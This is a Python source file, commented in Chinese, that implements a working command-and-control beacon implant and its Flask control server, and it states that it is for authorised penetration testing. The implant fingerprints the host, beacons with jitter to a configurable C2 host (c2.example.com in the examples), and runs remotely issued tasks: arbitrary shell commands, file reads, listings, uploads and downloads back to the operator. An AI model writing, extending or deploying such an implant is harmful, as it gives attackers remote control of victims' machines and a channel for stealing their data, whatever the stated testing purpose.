#!/usr/bin/env python3
"""
Beacon 通信模块 - Beacon Communication Module

轻量级 Beacon 实现，支持多种隧道类型
仅用于授权渗透测试和安全研究

特性:
    - 心跳模式通信
    - 多隧道支持 (HTTP/DNS/WebSocket)
    - 加密通信
    - 任务执行
    - 自动重连
"""

import hashlib
import logging
import os
import platform
import socket
import subprocess
import threading
import time
import uuid
from dataclasses import dataclass
from enum import Enum
from typing import Any, Dict, List, Optional

from .base import BaseC2, BeaconInfo, C2Config, C2Status, Task, TaskResult, TaskTypes
from .crypto import C2Crypto
from .protocol import ProtocolCodec, decode_tasks, encode_heartbeat, encode_result
from .tunnels import BaseTunnel, create_tunnel

logger = logging.getLogger(__name__)


class BeaconMode(Enum):
    """Beacon 运行模式"""

    INTERACTIVE = "interactive"  # 交互模式（低延迟）
    SLEEP = "sleep"  # 睡眠模式（正常心跳）
    LOW = "low"  # 低频模式（长间隔）


@dataclass
class BeaconConfig(C2Config):
    """
    Beacon 配置

    继承 C2Config 并添加 Beacon 特定配置
    """

    # 端点配置（覆盖默认值）
    checkin_endpoint: str = "/api/checkin"
    task_endpoint: str = "/api/tasks"
    result_endpoint: str = "/api/results"

    # Beacon 特定配置
    initial_delay: float = 0.0  # 启动延迟
    kill_date: Optional[float] = None  # 自毁日期（时间戳）

    # 执行配置
    shell_timeout: int = 60  # Shell 命令超时
    max_output_size: int = 10000  # 最大输出大小

    def __post_init__(self):
        """初始化后处理"""
        super().__post_init__()

        # 同步端点配置
        self.checkin_path = self.checkin_endpoint
        self.task_path = self.task_endpoint
        self.result_path = self.result_endpoint


class Beacon(BaseC2):
    """
    轻量级 Beacon - 心跳模式通信

    通过可配置的隧道与 C2 服务器通信，支持任务获取和执行

    Usage:
        # 基本用法
        config = BeaconConfig(
            server="c2.example.com",
            port=443,
            protocol="https"
        )
        beacon = Beacon(config)

        # 注册任务处理器 (安全示例 - 使用subprocess而非os.popen)
        def safe_shell_handler(cmd: str) -> str:
            '''安全的shell命令处理器'''
            import subprocess
            import shlex
            try:
                # 使用列表形式调用，避免shell注入
                result = subprocess.run(
                    cmd if isinstance(cmd, list) else ['sh', '-c', cmd],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                return result.stdout[:10000]  # 限制输出大小
            except subprocess.TimeoutExpired:
                return "[Error] Command timeout"
            except Exception as e:
                return f"[Error] {e}"

        beacon.register_handler('shell', safe_shell_handler)

        # 启动 Beacon
        beacon.start()

        # 停止
        beacon.stop()
    """

    def __init__(self, config: BeaconConfig):
        """
        初始化 Beacon

        Args:
            config: Beacon 配置
        """
        super().__init__(config)

        self.config: BeaconConfig = config
        self.beacon_id = self._generate_beacon_id()

        # 隧道
        self._tunnel: Optional[BaseTunnel] = None

        # 运行状态
        self._running = False
        self._starting = False  # 新增：标记是否正在启动中
        self._thread: Optional[threading.Thread] = None
        self._state_lock = threading.Lock()
        self._startup_lock = threading.Lock()  # 新增：启动锁，防止并发启动
        self._stop_event = threading.Event()
        self._mode = BeaconMode.SLEEP

        # 编解码器
        self._codec = ProtocolCodec(compress=True)
        self._crypto: Optional[C2Crypto] = None

        # 初始化加密
        if config.encryption != "none" and config.key:
            self._crypto = C2Crypto(config.encryption, config.key)
            self._codec = ProtocolCodec(crypto=self._crypto, compress=True)

        # 系统信息
        self._info = self._collect_system_info()

        # 注册默认处理器
        self._register_default_handlers()

    def _generate_beacon_id(self) -> str:
        """生成唯一 Beacon ID"""
        unique_string = f"{socket.gethostname()}-{uuid.getnode()}-{os.getpid()}"
        return hashlib.md5(unique_string.encode()).hexdigest()[:16]

    def _collect_system_info(self) -> BeaconInfo:
        """收集系统信息"""
        hostname = socket.gethostname()
        username = os.getenv("USERNAME", os.getenv("USER", "unknown"))
        os_info = f"{platform.system()} {platform.release()}"
        arch = platform.machine()
        pid = os.getpid()

        # 获取本地 IP
        ip_address = "127.0.0.1"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except (OSError, socket.error) as e:
            logger.debug(f"Failed to get local IP: {e}")

        # 检测完整性级别
        integrity = "medium"
        if platform.system() == "Windows":
            try:
                import ctypes

                if ctypes.windll.shell32.IsUserAnAdmin():
                    integrity = "high"
            except (ImportError, AttributeError, OSError) as e:
                logger.debug(f"Failed to check admin status: {e}")

        elif os.geteuid() == 0:
            integrity = "high"

        return BeaconInfo(
            beacon_id=self.beacon_id,
            hostname=hostname,
            username=username,
            os_info=os_info,
            arch=arch,
            ip_address=ip_address,
            pid=pid,
            integrity=integrity,
            sleep_time=self.config.interval,
        )

    def _register_default_handlers(self) -> None:
        """注册默认任务处理器"""
        self.register_handler(TaskTypes.SHELL, self._handle_shell)
        self.register_handler(TaskTypes.SLEEP, self._handle_sleep)
        self.register_handler(TaskTypes.EXIT, self._handle_exit)
        self.register_handler(TaskTypes.CHECKIN, self._handle_checkin)
        self.register_handler(TaskTypes.PWD, self._handle_pwd)
        self.register_handler(TaskTypes.CD, self._handle_cd)
        self.register_handler(TaskTypes.LS, self._handle_ls)
        self.register_handler(TaskTypes.CAT, self._handle_cat)
        self.register_handler(TaskTypes.PS, self._handle_ps)
        self.register_handler(TaskTypes.UPLOAD, self._handle_upload)
        self.register_handler(TaskTypes.DOWNLOAD, self._handle_download)

    # ==================== 连接管理 ====================

    def connect(self) -> bool:
        """
        建立连接

        Returns:
            是否成功
        """
        self._set_status(C2Status.CONNECTING)

        try:
            # 创建隧道
            self._tunnel = create_tunnel(
                protocol=self.config.protocol,
                server=self.config.server,
                port=self.config.port,
                config=self.config,
            )

            # 连接隧道
            if self._tunnel.connect():
                self._set_status(C2Status.CONNECTED)

                # 发送签到
                self._checkin()

                logger.info(f"Beacon connected: {self.beacon_id}")
                return True

            self._set_status(C2Status.ERROR)
            return False

        except (ConnectionError, TimeoutError, OSError) as e:
            logger.error(f"Beacon connect error: {e}")
            self._set_status(C2Status.ERROR)
            return False
        except ValueError as e:
            logger.error(f"Beacon config error: {e}")
            self._set_status(C2Status.ERROR)
            return False

    def disconnect(self) -> None:
        """断开连接"""
        if self._tunnel:
            try:
                self._tunnel.disconnect()
            except (ConnectionError, OSError) as e:
                logger.warning(f"Error during disconnect: {e}")

            self._tunnel = None

        self._set_status(C2Status.DISCONNECTED)
        logger.info("Beacon disconnected")

    def reconnect(self) -> bool:
        """重新连接"""
        self._set_status(C2Status.RECONNECTING)
        self.disconnect()

        for attempt in range(self.config.max_retries):
            delay = self.config.retry_delay * (2**attempt)
            logger.info(
                f"Reconnecting in {delay:.1f}s (attempt {attempt + 1}/{self.config.max_retries})"
            )
            # 使用 _stop_event.wait 支持中断
            if self._stop_event.wait(delay):
                return False  # 被中断

            if self.connect():
                return True

        return False

    # ==================== 数据收发 ====================

    def send(self, data: bytes) -> bool:
        """
        发送数据

        Args:
            data: 要发送的数据

        Returns:
            是否成功
        """
        if not self._tunnel:
            return False

        return self._tunnel.send(data)

    def receive(self) -> Optional[bytes]:
        """
        接收数据

        Returns:
            接收到的数据
        """
        if not self._tunnel:
            return None

        return self._tunnel.receive(timeout=self.config.timeout)

    # ==================== Beacon 循环 ====================

    def _set_running(self, value: bool) -> None:
        """设置运行状态（线程安全）"""
        with self._state_lock:
            self._running = value
            if value:
                self._stop_event.clear()
            else:
                self._stop_event.set()

    def _is_running(self) -> bool:
        """
        检查是否正在运行（线程安全）

        Returns:
            True 如果 Beacon 正在运行或正在启动中

        Note:
            此方法在锁内原子地检查所有状态，避免 TOCTOU 问题
        """
        with self._state_lock:
            # 正在启动中也算运行
            if self._starting:
                return True
            if not self._running:
                return False
            # 缓存线程引用并在锁内检查
            thread = self._thread
            if thread is None:
                return False
            # 在锁内检查线程状态
            return thread.is_alive()

    def _request_stop(self) -> None:
        """请求停止（线程安全）"""
        self._set_running(False)

    def start(self) -> None:
        """
        启动 Beacon 循环

        使用双重锁机制防止并发启动竞态条件：
        1. _startup_lock: 确保只有一个线程能执行启动流程
        2. _state_lock: 保护状态变量的读写
        """
        # 使用非阻塞方式获取启动锁，防止多个线程同时启动
        if not self._startup_lock.acquire(blocking=False):
            logger.debug("Beacon startup already in progress")
            return

        try:
            with self._state_lock:
                # 检查是否已经在运行
                if self._running and self._thread and self._thread.is_alive():
                    logger.debug("Beacon already running")
                    return

                # 检查自毁日期
                if self.config.kill_date and time.time() > self.config.kill_date:
                    logger.warning("Kill date reached, not starting")
                    return

                # 标记为正在启动
                self._starting = True
                self._running = True
                self._stop_event.clear()

            # 启动延迟（在锁外执行，避免阻塞其他操作）
            if self.config.initial_delay > 0:
                # 使用 _stop_event.wait 代替 time.sleep，支持中断
                if self._stop_event.wait(self.config.initial_delay):
                    logger.info("Beacon startup cancelled during delay")
                    self._cleanup_startup()
                    return

            # 连接（在锁外执行）
            if not self.connect():
                logger.error("Failed to connect, not starting beacon loop")
                self._cleanup_startup()
                return

            # 创建并启动线程（在锁内）
            with self._state_lock:
                # 再次检查，可能在连接期间被停止
                if not self._running:
                    logger.info("Beacon stopped during startup")
                    return

                self._thread = threading.Thread(
                    target=self._beacon_loop, daemon=True, name=f"Beacon-{self.beacon_id[:8]}"
                )
                self._thread.start()
                self._starting = False  # 启动完成

            logger.info(f"Beacon started: {self.beacon_id}")

        finally:
            self._startup_lock.release()

    def _cleanup_startup(self) -> None:
        """清理失败的启动状态"""
        with self._state_lock:
            self._running = False
            self._starting = False
            self._stop_event.set()

    def stop(self) -> None:
        """
        停止 Beacon（线程安全）

        处理多种状态：
        1. 正在启动中 (_starting=True) - 通过stop_event中断
        2. 正在运行 (_running=True) - 正常停止
        3. 已停止 - 无操作
        """
        # 首先设置停止标志，中断任何等待操作
        with self._state_lock:
            was_starting = self._starting
            was_running = self._running
            self._running = False
            self._starting = False
            self._stop_event.set()
            thread = self._thread
            self._thread = None

        # 如果正在启动中，等待启动锁释放
        if was_starting:
            # 尝试获取启动锁以确保启动流程已结束
            acquired = self._startup_lock.acquire(timeout=2.0)
            if acquired:
                self._startup_lock.release()
            else:
                logger.warning("Timeout waiting for startup to complete")

        # 等待线程结束（在锁外）
        if thread and thread is not threading.current_thread():
            thread.join(timeout=5.0)
            if thread.is_alive():
                logger.warning("Beacon thread did not stop gracefully")

        # 断开连接
        self.disconnect()

        if was_running or was_starting:
            logger.info("Beacon stopped")

    def run(self) -> None:
        """同步运行 Beacon（阻塞）"""
        self.start()

        try:
            while not self._stop_event.is_set():
                self._stop_event.wait(1.0)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def run_async(self) -> Optional[threading.Thread]:
        """
        异步运行 Beacon

        Returns:
            启动成功返回线程对象，失败返回 None
        """
        self.start()
        with self._state_lock:
            # 确保线程已成功创建并运行
            if self._thread and self._thread.is_alive():
                return self._thread
            return None

    def _beacon_loop(self) -> None:
        """Beacon 主循环"""
        try:
            while not self._stop_event.is_set():
                try:
                    # 检查自毁日期
                    if self.config.kill_date and time.time() > self.config.kill_date:
                        logger.warning("Kill date reached, stopping")
                        self._request_stop()
                        break

                    # 发送心跳
                    self._send_heartbeat()

                    # 获取任务
                    tasks = self._check_tasks()

                    # 执行任务
                    for task in tasks:
                        if self._stop_event.is_set():
                            break

                        result = self.process_task(task)
                        self._send_result(result)

                        # 如果是退出任务，停止循环
                        if task.type == TaskTypes.EXIT:
                            self._request_stop()
                            break

                except (ConnectionError, TimeoutError, OSError) as e:
                    logger.error(f"Beacon loop network error: {e}")

                    # 尝试重连
                    if not self._stop_event.is_set() and self.status == C2Status.CONNECTED:
                        if not self.reconnect():
                            logger.error("Reconnect failed, stopping")
                            self._request_stop()
                            break
                except (ValueError, KeyError) as e:
                    logger.error(f"Beacon loop data error: {e}")
                    # 数据错误不需要重连，继续下一轮

                # 计算睡眠时间
                if not self._stop_event.is_set():
                    sleep_time = self._calculate_sleep()
                    if self._stop_event.wait(sleep_time):
                        break
        finally:
            self._request_stop()

        logger.info("Beacon loop ended")

    def _calculate_sleep(self) -> float:
        """计算带抖动的睡眠时间"""
        import secrets

        base = self.config.interval
        jitter = base * self.config.jitter

        # 使用 secrets 模块生成随机抖动（范围 -jitter 到 +jitter）
        # secrets.randbelow 返回 [0, n)，转换为 [-jitter, +jitter]
        if jitter > 0:
            # 生成 0 到 2*jitter 范围的随机数，然后减去 jitter
            random_offset = (secrets.randbelow(int(jitter * 2000)) / 1000.0) - jitter
            return base + random_offset
        return base

    # ==================== 通信方法 ====================

    def _checkin(self) -> bool:
        """发送签到"""
        try:
            data = self._codec.encode_checkin(self._info)
            return self.send(data)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.error(f"Checkin network error: {e}")
            return False
        except (ValueError, KeyError) as e:
            logger.error(f"Checkin encode error: {e}")
            return False

    def _send_heartbeat(self) -> None:
        """发送心跳"""
        try:
            data = encode_heartbeat(self.beacon_id)
            self.send(data)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.debug(f"Heartbeat network error: {e}")
        except (ValueError, KeyError) as e:
            logger.debug(f"Heartbeat encode error: {e}")

    def _check_tasks(self) -> List[Task]:
        """获取待执行任务"""
        try:
            response = self.receive()
            if response:
                return decode_tasks(response)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.debug(f"Check tasks network error: {e}")
        except (ValueError, KeyError) as e:
            logger.debug(f"Check tasks decode error: {e}")

        return []

    def _send_result(self, result: TaskResult) -> bool:
        """发送任务结果"""
        try:
            data = encode_result(result)
            return self.send(data)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.error(f"Send result network error: {e}")
            return False
        except (ValueError, KeyError) as e:
            logger.error(f"Send result encode error: {e}")
            return False

    # ==================== 任务处理器 ====================

    def _handle_shell(self, command: str) -> str:
        """执行 Shell 命令"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["cmd.exe", "/c", command],
                    capture_output=True,
                    text=True,
                    timeout=self.config.shell_timeout,
                )
            else:
                result = subprocess.run(
                    ["/bin/bash", "-c", command],
                    capture_output=True,
                    text=True,
                    timeout=self.config.shell_timeout,
                )

            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]\n{result.stderr}"

            # 限制输出大小
            return output[: self.config.max_output_size]

        except subprocess.TimeoutExpired:
            return "[Error] Command timed out"
        except (OSError, subprocess.SubprocessError) as e:
            return f"[Error] Execution failed: {e}"

    def _handle_sleep(self, payload: Any) -> str:
        """修改睡眠时间"""
        try:
            if isinstance(payload, dict):
                interval = payload.get("interval", payload.get("time"))
                jitter = payload.get("jitter")
            else:
                interval = int(payload)
                jitter = None

            if interval:
                self.config.interval = float(interval)

            if jitter is not None:
                self.config.jitter = float(jitter)

            return f"Sleep time set to {self.config.interval}s (jitter: {self.config.jitter})"

        except (ValueError, TypeError) as e:
            return f"[Error] Invalid sleep config: {e}"

    def _handle_exit(self, payload: Any) -> str:
        """退出 Beacon"""
        self._request_stop()
        return "Exiting..."

    def _handle_checkin(self, payload: Any) -> Dict[str, Any]:
        """返回系统信息"""
        return self._info.to_dict()

    def _handle_pwd(self, payload: Any) -> str:
        """返回当前目录"""
        return os.getcwd()

    def _handle_cd(self, path: str) -> str:
        """切换目录"""
        try:
            os.chdir(path)
            return os.getcwd()
        except (OSError, FileNotFoundError, PermissionError) as e:
            return f"[Error] Cannot change directory: {e}"

    def _handle_ls(self, path: str = None) -> str:
        """列出目录内容"""
        try:
            target = path or os.getcwd()
            entries = []

            for entry in os.listdir(target):
                full_path = os.path.join(target, entry)
                try:
                    stat = os.stat(full_path)
                    is_dir = "d" if os.path.isdir(full_path) else "-"
                    size = stat.st_size
                    entries.append(f"{is_dir} {size:>10} {entry}")
                except (OSError, PermissionError):
                    entries.append(f"? {'?':>10} {entry}")

            return "\n".join(entries)

        except (OSError, FileNotFoundError, PermissionError) as e:
            return f"[Error] Cannot list directory: {e}"

    def _handle_cat(self, path: str) -> str:
        """读取文件内容"""
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            return content[: self.config.max_output_size]
        except (OSError, FileNotFoundError, PermissionError) as e:
            return f"[Error] Cannot read file: {e}"

    def _handle_ps(self, payload: Any) -> str:
        """列出进程"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=30)
            return result.stdout[: self.config.max_output_size]
        except subprocess.TimeoutExpired:
            return "[Error] Process list timed out"
        except (OSError, subprocess.SubprocessError) as e:
            return f"[Error] Cannot list processes: {e}"

    def _handle_upload(self, payload: Dict[str, Any]) -> str:
        """上传文件到目标"""
        try:
            import base64

            path = payload.get("path")
            content_b64 = payload.get("content")

            if not path or not content_b64:
                return "[Error] Missing path or content"

            content = base64.b64decode(content_b64)
            with open(path, "wb") as f:
                f.write(content)

            return f"Uploaded {len(content)} bytes to {path}"

        except (OSError, PermissionError) as e:
            return f"[Error] Cannot write file: {e}"
        except (ValueError, TypeError) as e:
            return f"[Error] Invalid upload data: {e}"

    def _handle_download(self, path: str) -> Dict[str, Any]:
        """从目标下载文件"""
        try:
            import base64

            with open(path, "rb") as f:
                content = f.read()

            return {
                "path": path,
                "content": base64.b64encode(content).decode(),
                "size": len(content),
            }

        except (OSError, FileNotFoundError, PermissionError) as e:
            return {"error": f"Cannot read file: {e}"}


# ==================== Beacon 服务器 ====================


class BeaconServer:
    """
    Beacon 服务器 (C2 Server) - 线程安全版本

    接收和管理 Beacon 连接

    Usage:
        server = BeaconServer(host="0.0.0.0", port=8080)
        server.run()
    """

    # 默认配置：防止内存泄漏
    DEFAULT_MAX_BEACONS = 1000  # 最大 Beacon 数量
    DEFAULT_MAX_RESULTS_PER_BEACON = 100  # 每个 Beacon 最大结果数
    DEFAULT_BEACON_TIMEOUT = 3600  # Beacon 超时时间（秒）
    DEFAULT_CLEANUP_INTERVAL = 300  # 清理间隔（秒）

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8080,
        max_beacons: int = DEFAULT_MAX_BEACONS,
        max_results_per_beacon: int = DEFAULT_MAX_RESULTS_PER_BEACON,
        beacon_timeout: float = DEFAULT_BEACON_TIMEOUT,
    ):
        """
        初始化服务器

        Args:
            host: 监听地址
            port: 监听端口
            max_beacons: 最大 Beacon 数量（防止内存泄漏）
            max_results_per_beacon: 每个 Beacon 最大结果数
            beacon_timeout: Beacon 超时时间（秒），超时后自动清理
        """
        self.host = host
        self.port = port
        self.max_beacons = max_beacons
        self.max_results_per_beacon = max_results_per_beacon
        self.beacon_timeout = beacon_timeout

        # 存储
        self.beacons: Dict[str, BeaconInfo] = {}
        self.tasks: Dict[str, List[Task]] = {}  # beacon_id -> tasks
        self.results: Dict[str, List[TaskResult]] = {}  # beacon_id -> results

        # 线程锁
        self._beacons_lock = threading.Lock()
        self._tasks_lock = threading.Lock()
        self._results_lock = threading.Lock()

        self._app = None
        self._running = False
        self._cleanup_thread: Optional[threading.Thread] = None

    def _cleanup_stale_beacons(self) -> int:
        """
        清理过期的 Beacon（线程安全）

        Returns:
            清理的 Beacon 数量
        """
        now = time.time()
        stale_ids = []

        with self._beacons_lock:
            for beacon_id, info in self.beacons.items():
                if now - info.last_seen > self.beacon_timeout:
                    stale_ids.append(beacon_id)

            for beacon_id in stale_ids:
                del self.beacons[beacon_id]

        # 清理相关的 tasks 和 results
        if stale_ids:
            with self._tasks_lock:
                for beacon_id in stale_ids:
                    self.tasks.pop(beacon_id, None)

            with self._results_lock:
                for beacon_id in stale_ids:
                    self.results.pop(beacon_id, None)

            logger.info(f"清理了 {len(stale_ids)} 个过期 Beacon")

        return len(stale_ids)

    def _trim_results(self, beacon_id: str) -> None:
        """
        修剪结果列表，保持在限制内（需要在锁内调用）

        Args:
            beacon_id: Beacon ID
        """
        # 注意：调用者必须持有 _results_lock
        if beacon_id in self.results:
            results_list = self.results[beacon_id]
            if len(results_list) > self.max_results_per_beacon:
                # 保留最新的结果
                self.results[beacon_id] = results_list[-self.max_results_per_beacon :]

    def _cleanup_loop(self) -> None:
        """后台清理循环"""
        while self._running:
            time.sleep(self.DEFAULT_CLEANUP_INTERVAL)
            if self._running:
                try:
                    self._cleanup_stale_beacons()
                except Exception as e:
                    logger.error(f"清理 Beacon 失败: {e}")

    def add_task(self, beacon_id: str, task_type: str, payload: Any, timeout: float = 300.0) -> str:
        """
        添加任务（线程安全）

        Args:
            beacon_id: Beacon ID
            task_type: 任务类型
            payload: 任务载荷
            timeout: 超时时间

        Returns:
            任务 ID
        """
        task = Task.create(task_type, payload, timeout)

        with self._tasks_lock:
            if beacon_id not in self.tasks:
                self.tasks[beacon_id] = []
            self.tasks[beacon_id].append(task)

        logger.info(f"Task added for {beacon_id}: {task.id}")
        return task.id

    def get_beacons(self) -> List[BeaconInfo]:
        """获取所有 Beacon（线程安全）"""
        with self._beacons_lock:
            return list(self.beacons.values())

    def get_results(self, beacon_id: str) -> List[TaskResult]:
        """获取 Beacon 结果（线程安全）"""
        with self._results_lock:
            return list(self.results.get(beacon_id, []))

    def run(self) -> None:
        """运行服务器"""
        try:
            from flask import Flask, jsonify, request
        except ImportError:
            logger.error("Flask not installed. Install: pip install flask")
            return

        app = Flask(__name__)
        self._app = app

        @app.route("/api/checkin", methods=["POST"])
        def checkin():
            data = request.json
            beacon_id = data.get("beacon_id")

            if beacon_id:
                with self._beacons_lock:
                    if beacon_id not in self.beacons:
                        # 检查是否超过最大 Beacon 数量
                        if len(self.beacons) >= self.max_beacons:
                            logger.warning(
                                f"达到最大 Beacon 数量限制 ({self.max_beacons})，拒绝新连接"
                            )
                            return jsonify({"status": "error", "message": "server full"}), 503

                        self.beacons[beacon_id] = BeaconInfo(
                            beacon_id=beacon_id,
                            hostname=data.get("hostname", ""),
                            username=data.get("username", ""),
                            os_info=data.get("os_info", ""),
                            arch=data.get("arch", ""),
                            ip_address=data.get("ip_address", ""),
                            pid=data.get("pid", 0),
                        )
                        logger.info(f"New beacon: {beacon_id}")
                    else:
                        self.beacons[beacon_id].last_seen = time.time()

                return jsonify({"status": "ok", "session": beacon_id})

            return jsonify({"status": "error"}), 400

        @app.route("/api/tasks/<beacon_id>", methods=["GET"])
        def get_tasks(beacon_id):
            with self._tasks_lock:
                tasks = self.tasks.get(beacon_id, [])
                pending = [t for t in tasks if t.priority >= 0]

                task_data = [
                    {
                        "id": t.id,
                        "type": t.type,
                        "payload": t.payload,
                        "timeout": t.timeout,
                    }
                    for t in pending
                ]

                # 标记为已发送
                for t in pending:
                    t.priority = -1

            return jsonify({"tasks": task_data})

        @app.route("/api/results", methods=["POST"])
        def receive_result():
            data = request.json
            beacon_id = data.get("beacon_id")

            result = TaskResult(
                task_id=data.get("task_id", ""),
                success=data.get("success", False),
                output=data.get("output"),
                error=data.get("error"),
            )

            with self._results_lock:
                if beacon_id not in self.results:
                    self.results[beacon_id] = []
                self.results[beacon_id].append(result)
                # 修剪结果列表，防止内存泄漏
                self._trim_results(beacon_id)

            logger.info(f"Result from {beacon_id}: task {result.task_id}")
            return jsonify({"status": "ok"})

        logger.info(f"Beacon server starting on {self.host}:{self.port}")
        self._running = True

        # 启动后台清理线程
        self._cleanup_thread = threading.Thread(
            target=self._cleanup_loop, daemon=True, name="BeaconServer-Cleanup"
        )
        self._cleanup_thread.start()

        app.run(host=self.host, port=self.port, debug=False, threaded=True)

    def run_async(self) -> threading.Thread:
        """异步运行服务器"""
        thread = threading.Thread(target=self.run, daemon=True)
        thread.start()
        return thread

    def stop(self) -> None:
        """停止服务器"""
        self._running = False
        # 清理线程会在下一个循环自动退出

    def clear_beacon(self, beacon_id: str) -> bool:
        """
        手动清理指定 Beacon（线程安全）

        Args:
            beacon_id: Beacon ID

        Returns:
            是否成功清理
        """
        removed = False

        with self._beacons_lock:
            if beacon_id in self.beacons:
                del self.beacons[beacon_id]
                removed = True

        with self._tasks_lock:
            self.tasks.pop(beacon_id, None)

        with self._results_lock:
            self.results.pop(beacon_id, None)

        if removed:
            logger.info(f"手动清理 Beacon: {beacon_id}")

        return removed

    def get_stats(self) -> Dict[str, Any]:
        """
        获取服务器统计信息（线程安全）

        Returns:
            统计信息字典
        """
        with self._beacons_lock:
            beacon_count = len(self.beacons)

        with self._tasks_lock:
            task_count = sum(len(tasks) for tasks in self.tasks.values())

        with self._results_lock:
            result_count = sum(len(results) for results in self.results.values())

        return {
            "beacons": beacon_count,
            "max_beacons": self.max_beacons,
            "tasks": task_count,
            "results": result_count,
            "running": self._running,
        }


# ==================== 便捷函数 ====================


def create_beacon(
    server: str,
    port: int = 443,
    protocol: str = "https",
    interval: float = 60.0,
    encryption_key: Optional[str] = None,
) -> Beacon:
    """
    创建 Beacon 实例

    Args:
        server: C2 服务器地址
        port: 端口
        protocol: 协议
        interval: 心跳间隔
        encryption_key: 加密密钥

    Returns:
        Beacon 实例
    """
    config = BeaconConfig(
        server=server,
        port=port,
        protocol=protocol,
        interval=interval,
        key=encryption_key.encode() if encryption_key else None,
    )
    return Beacon(config)


def start_beacon_server(host: str = "0.0.0.0", port: int = 8080) -> BeaconServer:
    """
    启动 Beacon 服务器

    Args:
        host: 监听地址
        port: 监听端口

    Returns:
        BeaconServer 实例
    """
    server = BeaconServer(host, port)
    server.run_async()
    return server


__all__ = [
    "BeaconMode",
    "BeaconConfig",
    "Beacon",
    "BeaconServer",
    "create_beacon",
    "start_beacon_server",
]


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
    logger.info("Beacon Module - Lightweight C2 Beacon")
    logger.info("=" * 50)
    logger.warning("[!] This module is for authorized penetration testing only!")
    logger.info("Usage:")
    logger.info("  # Server side:")
    logger.info("  from core.c2 import start_beacon_server")
    logger.info("  server = start_beacon_server(port=8080)")
    logger.info("")
    logger.info("  # Client side:")
    logger.info("  from core.c2 import create_beacon")
    logger.info("  beacon = create_beacon('http://c2.example.com', port=8080)")
    logger.info("  beacon.run()")
